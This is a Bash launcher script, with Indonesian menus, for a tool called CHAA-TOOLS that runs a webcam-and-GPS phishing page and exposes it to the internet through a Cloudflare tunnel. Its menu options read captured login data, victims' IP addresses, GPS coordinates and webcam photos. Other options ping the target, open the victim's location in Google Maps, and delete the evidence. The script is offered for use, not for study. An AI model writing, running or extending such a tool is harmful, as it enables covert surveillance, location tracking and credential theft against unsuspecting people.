#!/usr/bin/env bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Fungsi tampilan menu
show_menu() {
    clear
    echo -e "${CYAN}     ██████╗██╗  ██╗ █████╗  █████╗     ████████╗ ██████╗ ██╗     ███████╗${NC}"
    echo -e "${CYAN}    ██╔════╝██║  ██║██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██║     ██╔════╝${NC}"
    echo -e "${CYAN}    ██║     ███████║███████║███████║       ██║   ██║   ██║██║     ███████╗${NC}"
    echo -e "${CYAN}    ██║     ██╔══██║██╔══██║██╔══██║       ██║   ██║   ██║██║     ╚════██║${NC}"
    echo -e "${CYAN}    ╚██████╗██║  ██║██║  ██║██║  ██║       ██║   ╚██████╔╝███████╗███████║${NC}"
    echo -e "${CYAN}     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚══════╝╚══════╝${NC}"
    echo ""
    echo -e "${CYAN}  ╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}      ${YELLOW}⚡ CHAA-TOOLS v2.1 ⚡${NC}              ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠══════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${WHITE}Author   : nzm${NC}                           ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${WHITE}Version  : 2.1${NC}                           ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${WHITE}Status   : ${GREEN}DEVELOPER${NC}                        ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}[ MAIN MENU ]${NC}"
    echo ""
    echo -e "${GREEN}  [01]${NC}  CAMERA PHISH (WEBCAM + GPS)"
    echo -e "${GREEN}  [02]${NC}  CEK HASIL (FOTO + IP + GPS)"
    echo -e "${GREEN}  [03]${NC}  BUKA FOTO (TERMUX-VIEWER)"
    echo -e "${GREEN}  [04]${NC}  COPY FOTO KE GALERI"
    echo -e "${GREEN}  [05]${NC}  CEK IP TARGET"
    echo -e "${GREEN}  [06]${NC}  CEK INFO TARGET (IP + GPS + WAKTU)"
    echo -e "${GREEN}  [07]${NC}  CEK KONEKSI TARGET (PING)"
    echo -e "${GREEN}  [08]${NC}  BUKA LOKASI TARGET (MAPS)"
    echo -e "${GREEN}  [09]${NC}  CEK IP PUBLIK SENDIRI"
    echo -e "${RED}  [10]${NC}  HAPUS SEMUA HASIL"
    echo -e "${RED}  [00]${NC}  KELUAR"
    echo ""
    echo -e "${CYAN}  ══════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  📌 CHAA TOLS${NC}"
    echo -e "${CYAN}  ══════════════════════════════════════════════════${NC}"
    echo ""
    read -p "➤ Pilih menu : " menu

    case $menu in
        1)
            echo -e "${YELLOW}🔥 Memulai Camera Phish...${NC}"
            echo -e "${YELLOW}⏳ Mohon tunggu...${NC}"
            echo -e "${YELLOW}📌 Tekan ${GREEN}ENTER${YELLOW} untuk kembali ke menu${NC}"
            cd "/c/Users/GG/cha-phish/ai mamb" && python app.py > /dev/null 2>&1 &
            sleep 4
            ./cloudflared.exe tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' &
            CLOUD_PID=$!
            read -p ""
            echo -e "\n${YELLOW}⏹ Menghentikan tunnel...${NC}"
            kill $CLOUD_PID 2>/dev/null
            pkill -f python 2>/dev/null
            show_menu
            ;;
        2)
            echo -e "${GREEN}▶ CEK HASIL${NC}"
            cd "/c/Users/GG/cha-phish/ai mamb/captured"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}📊 DATA LOGIN + GPS${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            cat data.txt 2>/dev/null || echo "Belum ada data"
            echo ""
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}📸 DAFTAR FOTO${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            ls images/ 2>/dev/null || echo "Belum ada foto"
            echo ""
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        3)
            echo -e "${GREEN}▶ BUKA FOTO${NC}"
            cd "/c/Users/GG/cha-phish/ai mamb/captured/images"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}📸 DAFTAR FOTO${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            ls 2>/dev/null || echo "Belum ada foto"
            echo ""
            read -p "Masukkan nama file foto: " foto
            start "$foto" 2>/dev/null || echo "File tidak ditemukan"
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        4)
            echo -e "${GREEN}▶ COPY FOTO KE GALERI${NC}"
            cp "/c/Users/GG/cha-phish/ai mamb/captured/images"/*.jpg /c/Users/GG/Pictures/ 2>/dev/null
            echo -e "${GREEN}✅ Foto berhasil disalin ke Pictures!${NC}"
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        5)
            echo -e "${GREEN}▶ CEK IP TARGET${NC}"
            cd "/c/Users/GG/cha-phish/ai mamb/captured"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}🌐 IP TARGET TERAKHIR${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            grep -oE 'IP     : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt 2>/dev/null | tail -1 || echo "Belum ada data"
            echo ""
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        6)
            echo -e "${GREEN}▶ CEK INFO TARGET${NC}"
            cd "/c/Users/GG/cha-phish/ai mamb/captured"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}📊 INFO TARGET TERAKHIR${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            tail -4 data.txt 2>/dev/null || echo "Belum ada data"
            echo ""
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        7)
            echo -e "${GREEN}▶ CEK KONEKSI TARGET${NC}"
            cd "/c/Users/GG/cha-phish/ai mamb/captured"
            IP=$(grep -oE 'IP     : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt 2>/dev/null | tail -1 | awk '{print $3}')
            if [ -n "$IP" ]; then
                echo -e "${YELLOW}📍 Ping ke $IP ...${NC}"
                ping -c 4 $IP
            else
                echo -e "${RED}❌ Belum ada IP target!${NC}"
            fi
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        8)
            echo -e "${GREEN}▶ BUKA LOKASI TARGET DI MAPS${NC}"
            cd "/c/Users/GG/cha-phish/ai mamb/captured"
            COORD=$(grep -oE 'GPS    : [0-9.-]+, [0-9.-]+' data.txt 2>/dev/null | tail -1 | sed 's/GPS    : //')
            if [ -n "$COORD" ]; then
                echo -e "${YELLOW}📍 Buka maps: $COORD${NC}"
                start "https://maps.google.com/?q=$COORD"
            else
                echo -e "${RED}❌ Belum ada GPS target!${NC}"
            fi
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        9)
            echo -e "${GREEN}▶ CEK IP PUBLIK SENDIRI${NC}"
            echo -e "${YELLOW}🌐 IP publik lo:${NC}"
            curl -s ifconfig.me
            echo ""
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        10)
            echo -e "${RED}▶ HAPUS SEMUA HASIL${NC}"
            rm -rf "/c/Users/GG/cha-phish/ai mamb/captured"/* 2>/dev/null
            echo -e "${GREEN}✅ Semua hasil berhasil dihapus!${NC}"
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        0)
            echo -e "${RED}Keluar...${NC}"
            exit
            ;;
        *)
            echo -e "${RED}❌ Pilihan salah!${NC}"
            sleep 1
            show_menu
            ;;
    esac
}

# ====== INTRO (CUMA SEKALI) ======
clear

echo -e "${CYAN}     ██████╗██╗  ██╗ █████╗  █████╗     ████████╗ ██████╗ ██╗     ███████╗${NC}"
echo -e "${CYAN}    ██╔════╝██║  ██║██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██║     ██╔════╝${NC}"
echo -e "${CYAN}    ██║     ███████║███████║███████║       ██║   ██║   ██║██║     ███████╗${NC}"
echo -e "${CYAN}    ██║     ██╔══██║██╔══██║██╔══██║       ██║   ██║   ██║██║     ╚════██║${NC}"
echo -e "${CYAN}    ╚██████╗██║  ██║██║  ██║██║  ██║       ██║   ╚██████╔╝███████╗███████║${NC}"
echo -e "${CYAN}     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚══════╝╚══════╝${NC}"
echo ""
echo -e "${CYAN}  ╔══════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}  ║${NC}      ${YELLOW}⚡ CHAA-TOOLS v2.1 ⚡${NC}              ${CYAN}║${NC}"
echo -e "${CYAN}  ╠══════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}  ║${NC}  ${WHITE}Author   : nzm${NC}                           ${CYAN}║${NC}"
echo -e "${CYAN}  ║${NC}  ${WHITE}Version  : 2.1${NC}                           ${CYAN}║${NC}"
echo -e "${CYAN}  ║${NC}  ${WHITE}Status   : ${GREEN}DEVELOPER${NC}                        ${CYAN}║${NC}"
echo -e "${CYAN}  ╚══════════════════════════════════════════════════╝${NC}"
echo ""

# Animasi ketikan "All tools by nzm"
echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
text="     All tools by nzm"
for ((i=0; i<${#text}; i++)); do
    echo -ne "${YELLOW}${text:$i:1}${NC}"
    sleep 0.05
done
echo ""
echo -e "${CYAN}─────────────────────────────────────────────────${NC}"

# Loading bar 4 detik
echo -e "${GREEN}Loading${NC}"
for i in {0..100..2}; do
    echo -ne "\r["
    for ((j=0; j<$i/2; j++)); do
        echo -ne "${GREEN}#${NC}"
    done
    for ((j=$i/2; j<50; j++)); do
        echo -ne "${WHITE}.${NC}"
    done
    echo -ne "] ${i}%"
    sleep 0.04
done
echo -e "\n${GREEN}✅ Loaded!${NC}"
sleep 0.5

show_menu
